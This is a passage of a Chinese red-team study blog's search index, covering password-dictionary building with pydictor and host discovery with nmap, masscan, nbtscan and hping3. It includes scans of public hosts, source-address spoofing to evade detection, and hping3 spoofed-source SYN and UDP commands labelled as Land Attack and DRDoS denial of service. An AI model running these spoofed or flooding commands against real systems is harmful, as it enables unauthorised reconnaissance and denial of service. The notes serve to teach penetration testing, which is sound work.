punctuation">]</span>postcode              <span class="token punctuation">[</span>+<span class="token punctuation">]</span>nickname             <span class="token punctuation">[</span>+<span class="token punctuation">]</span>idcard    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>jobnum                <span class="token punctuation">[</span>+<span class="token punctuation">]</span>otherdate            <span class="token punctuation">[</span>+<span class="token punctuation">]</span>usedcharpydictor SEDB<span class="token operator">>></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>新版pydictor生成字典时存在问题，需要下载旧版pydictor</p><p>wget <a href="https://github.com/LandGrey/pydictor/archive/refs/tags/v2.0.5.zip">https://github.com/LandGrey/pydictor/archive/refs/tags/v2.0.5.zip</a></p></blockquote><h4 id="合并去重"><a href="#合并去重" class="headerlink" title="合并去重"></a>合并去重</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python pydictor.py -tool unqbiner /my/all/dict/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>只需要指定路径</p></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/tools/pydictor-2.0.5<span class="token punctuation">]</span>└─$ python3 pydictor.py -tool uniqbiner ~/tools/pydictor-2.0.5/results/                              _ _      _              _ __  _   _  __<span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> ___<span class="token operator">|</span> <span class="token operator">|</span>_ ___  _ __                                               <span class="token operator">|</span> <span class="token string">'_ \| | | |/ _` | |/ __| __/ _ \| '</span>__<span class="token operator">|</span>                                              <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">||</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>                                                 <span class="token operator">|</span> .__/ <span class="token punctuation">\</span>__, <span class="token operator">|</span><span class="token punctuation">\</span>__,_<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span><span class="token punctuation">\</span>__<span class="token punctuation">\</span>___/<span class="token operator">|</span>_<span class="token operator">|</span>                                                 <span class="token operator">|</span>_<span class="token operator">|</span>    <span class="token operator">|</span>___/                            <span class="token number">2.0</span>.5<span class="token comment">#dev                        </span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Source of  :7869 lines<span class="token punctuation">[</span>+<span class="token punctuation">]</span> A total of :7869 lines<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Store <span class="token keyword">in</span>   :/home/kali/tools/pydictor-2.0.5/results/uniqbiner_034233.txt <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Cost       :0.2306 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主机发现</title>
      <link href="/2022/03/24/zhu-ji-fa-xian/"/>
      <url>/2022/03/24/zhu-ji-fa-xian/</url>
      
        <content type="html"><![CDATA[<p>开一个新坑，将市面上现在流传的 redteam 系列书籍进行一个学习记录，文章内容主要摘自某红队系列丛书。</p><p>本章节内容主要是介绍常见的主机扫描和服务扫描工具。</p><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><h3 id="官网"><a href="#官网" class="headerlink" title="官网"></a>官网</h3><p><a href="https://nmap.org/">https://nmap.org/</a></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Mac os：brew <span class="token function">install</span> nmapCentos：yum <span class="token function">install</span> nmapUbuntu：apt <span class="token function">install</span> nmap<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="参考手册"><a href="#参考手册" class="headerlink" title="参考手册"></a>参考手册</h3><p><a href="https://nmap.org/man/zh/index.html">https://nmap.org/man/zh/index.html</a></p><h3 id="扫描方式"><a href="#扫描方式" class="headerlink" title="扫描方式"></a>扫描方式</h3><ul><li>TCP：-sT</li><li>SYN：-sS</li><li>ACK：-sA</li><li>UDP：-sU</li><li>RPC：-sR</li><li>ICMP：-sP</li><li>Disable Port Scan：-sn</li></ul><h3 id="常用的扫描方法"><a href="#常用的扫描方法" class="headerlink" title="常用的扫描方法"></a>常用的扫描方法</h3><ul><li>扫描10000端口、操作系统、版本</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -T4 -A <span class="token operator">&lt;</span>target<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>版本探测</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -sV <span class="token operator">&lt;</span>target<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>操作系统探测</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -O <span class="token operator">&lt;</span>target<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="其他技巧"><a href="#其他技巧" class="headerlink" title="其他技巧"></a>其他技巧</h3><ul><li>–host-timeout 主机超时 通常选值：18000</li><li>–scan-delay 报文时间间隔 通常选值：1000</li><li>-S &lt;源地址&gt; 定义扫描源地址，为了不被发现</li></ul><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>nmap -v -iR 100000 -P0 -p 80</p><p><code>随机选择100000台主机扫描是否运行Web服务器（80端口）。由起始阶段发送探测报文来确定主机是否工作非常浪费时间，而且只需探测主机的一个端口，因此使用 -P0 禁止对主机列表。（-P0 就是 -Pn）</code></p><p>host company.com | cut -d ‘ ‘ -f 4 | nmap -v -iL -（host -l company.com | cut -d ‘ ‘ -f 4 | nmap -v -iL -）</p><p><code>进行DNS区域传输，已发现company.com中的主机，然后将IP地址提供给nmap</code></p><blockquote><p>host -l &lt;domain&gt; 需要有域系统的<strong>管理员权限</strong>，才可以列出所有子域名，一般情况下无法使用<br>cut -d ‘ ‘ -f 4 将输出终端的字符进行分割，-d 指定分割字符，指定分割位置<br>nmap -v -iL - 解析出来 ip 传给 nmap 扫描，-v 显示详细信息，-iL 指定传入的文件名</p></blockquote><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><ul><li><p>-oN <File></p></li><li><p>-oX <XML File></p></li><li><p>-oG <filespec></p><p>Grep输出 参考：<a href="http://www.unspecific.com/nmap-oG-output">http://www.unspecific.com/nmap-oG-output</a></p></li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">sudo</span> nmap -O -oG - www.baidu.com  Nmap <span class="token number">7.92</span> scan initiated Thu Mar <span class="token number">24</span> 06:16:08 <span class="token number">2022</span> as: nmap -O -oG - www.baidu.comHost: <span class="token number">110.242</span>.68.3 <span class="token punctuation">(</span><span class="token punctuation">)</span>   Status: UpHost: <span class="token number">110.242</span>.68.3 <span class="token punctuation">(</span><span class="token punctuation">)</span>   Ports: <span class="token number">80</span>/open/tcp//http///, <span class="token number">443</span>/open/tcp//https///     Ignored State: filtered <span class="token punctuation">(</span><span class="token number">998</span><span class="token punctuation">)</span>Seq Index: <span class="token number">256</span>   IP ID Seq: RandomizedNmap <span class="token keyword">done</span> at Thu Mar <span class="token number">24</span> 06:16:21 <span class="token number">2022</span> -- <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">12.63</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">sudo</span> nmap www.baidu.com -oG - <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'/open/&#123;print $2&#125;'</span><span class="token number">110.242</span>.68.3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>awk ‘/open/{print $2}’ 正则匹配含 open 的行，以空格为分割取第二列</p></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">sudo</span> nmap <span class="token number">110.242</span>.68.4/29 -oG - -sPNmap <span class="token number">7.92</span> scan initiated Thu Mar <span class="token number">24</span> 06:28:33 <span class="token number">2022</span> as: nmap -oG - -sP <span class="token number">110.242</span>.68.4/29Host: <span class="token number">110.242</span>.68.1 <span class="token punctuation">(</span><span class="token punctuation">)</span>   Status: UpHost: <span class="token number">110.242</span>.68.2 <span class="token punctuation">(</span><span class="token punctuation">)</span>   Status: UpHost: <span class="token number">110.242</span>.68.3 <span class="token punctuation">(</span><span class="token punctuation">)</span>   Status: UpHost: <span class="token number">110.242</span>.68.4 <span class="token punctuation">(</span><span class="token punctuation">)</span>   Status: UpHost: <span class="token number">110.242</span>.68.5 <span class="token punctuation">(</span><span class="token punctuation">)</span>   Status: UpHost: <span class="token number">110.242</span>.68.6 <span class="token punctuation">(</span><span class="token punctuation">)</span>   Status: UpHost: <span class="token number">110.242</span>.68.7 <span class="token punctuation">(</span><span class="token punctuation">)</span>   Status: UpNmap <span class="token keyword">done</span> at Thu Mar <span class="token number">24</span> 06:28:47 <span class="token number">2022</span> -- <span class="token number">8</span> IP addresses <span class="token punctuation">(</span><span class="token number">7</span> hosts up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">14.25</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a>masscan</h2><h3 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h3><p><a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">apt-get</span> --assume-yes <span class="token function">install</span> <span class="token function">git</span> <span class="token function">make</span> gcc<span class="token function">git</span> clone https://github.com/robertdavidgraham/masscan<span class="token builtin class-name">cd</span> masscan<span class="token function">make</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>该工具兼容Nmap的参数</p></blockquote><p>现在可以直接apt安装</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">apt</span> <span class="token function">install</span> masscan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="高级选项"><a href="#高级选项" class="headerlink" title="高级选项"></a>高级选项</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> masscan <span class="token number">121.37</span>.71.222 --port <span class="token number">3389</span> --adapter-ip <span class="token number">192.168</span>.186.26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220512164023.png"></p><ul><li>–adapter-ip 指定发包的IP地址</li><li>–adapter-port 指定发包的源端口</li><li>–adapter-mac 指定发包的源MAC地址</li><li>–router-mac 指定网关的MAC地址</li><li>–exclude IP地址范围黑名单，防止masscan扫描</li><li>–includefile，-iL 读取一个范围列表进行扫描</li><li>–wait 指定网发送包后的等待时间，默认为10秒</li></ul><h2 id="nbtscan"><a href="#nbtscan" class="headerlink" title="nbtscan"></a>nbtscan</h2><p>kali中已经安装：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─$ <span class="token function">whereis</span> nbtscannbtscan: /usr/bin/nbtscan /usr/share/man/man1/nbtscan.1.gz                                                                                                              ┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─$ nbtscanNBTscan version <span class="token number">1.7</span>.1.This is a <span class="token function">free</span> software and it comes with absolutely no warranty.You can use, distribute and modify it under terms of GNU GPL <span class="token number">2</span>+.Usage:nbtscan <span class="token punctuation">[</span>-v<span class="token punctuation">]</span> <span class="token punctuation">[</span>-d<span class="token punctuation">]</span> <span class="token punctuation">[</span>-e<span class="token punctuation">]</span> <span class="token punctuation">[</span>-l<span class="token punctuation">]</span> <span class="token punctuation">[</span>-t timeout<span class="token punctuation">]</span> <span class="token punctuation">[</span>-b bandwidth<span class="token punctuation">]</span> <span class="token punctuation">[</span>-r<span class="token punctuation">]</span> <span class="token punctuation">[</span>-q<span class="token punctuation">]</span> <span class="token punctuation">[</span>-s separator<span class="token punctuation">]</span> <span class="token punctuation">[</span>-m retransmits<span class="token punctuation">]</span> <span class="token punctuation">(</span>-f filename<span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token operator">&lt;</span>scan_range<span class="token operator">></span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="nbtscan示例"><a href="#nbtscan示例" class="headerlink" title="nbtscan示例"></a>nbtscan示例</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nbtscan -r <span class="token number">192.168</span>.0.1/24扫描整个C段nbtscan <span class="token number">192.168</span>.0.1-100扫描一个范围nbtscan -v -s <span class="token builtin class-name">:</span> <span class="token number">192.168</span>.0.0/24以 <span class="token builtin class-name">:</span> 分割显示结果nbtscan -f <span class="token operator">&lt;</span>File<span class="token operator">></span>从文件读取扫描范围<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─$ nbtscan -v -s <span class="token string">' '</span> <span class="token number">192.168</span>.0.112 <span class="token number">192.168</span>.0.112 DESKTOP-R5A39I1 00U<span class="token number">192.168</span>.0.112 DESKTOP-R5A39I1 20U<span class="token number">192.168</span>.0.112 WORKGROUP       00G<span class="token number">192.168</span>.0.112 MAC <span class="token number">18</span>:26:49:4c:f8:4c                                                                                                              ┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─$ nbtscan -v -s <span class="token string">' '</span> <span class="token number">192.168</span>.0.112 <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $1&#125;'</span> <span class="token operator">|</span> <span class="token function">uniq</span><span class="token number">192.168</span>.0.112<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>awk ‘{print $1}’取第一列</p><p>uniq 筛选出重复字符串</p></blockquote><h2 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h2><p>hping3主要是测试防火墙的拦截规则，对网络设备进行测试</p><p><img src="https://img1.imgtp.com/2022/03/24/pC7lL5tA.png"></p><h3 id="常用模式"><a href="#常用模式" class="headerlink" title="常用模式"></a>常用模式</h3><ul><li>-0 –rawip IP原始报文</li><li>-1 –icmp ICMP模式</li><li>-2 –udp UDP模式</li><li>-8 –scan 扫描模式</li><li>-9 –listen 监听模式</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> hping3 --scan <span class="token number">1</span>-30,70-90 -S www.baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>SYN方式扫描主机端口</p></blockquote><p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220512164222.png"></p><p>可以看到，目标主机回复：S..A，代表SYN/ACK</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> hping3 -S -a <span class="token number">114.114</span>.114.114 -p <span class="token number">53</span> <span class="token number">114.114</span>.114.114 -c <span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>测试防火墙对ICMP包的反应，是否支持traceroute，是否开放某个端口，对防火墙进行拒绝服务攻击（Dos attack）。例如，以Land Attack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立链接）。</p></blockquote><h3 id="DRDDOS"><a href="#DRDDOS" class="headerlink" title="DRDDOS"></a>DRDDOS</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> hping3 --udp -a <span class="token number">114.114</span>.114.114 -p <span class="token number">53</span> <span class="token number">114.114</span>.114.114 -c <span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>基于UDP的DOS</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
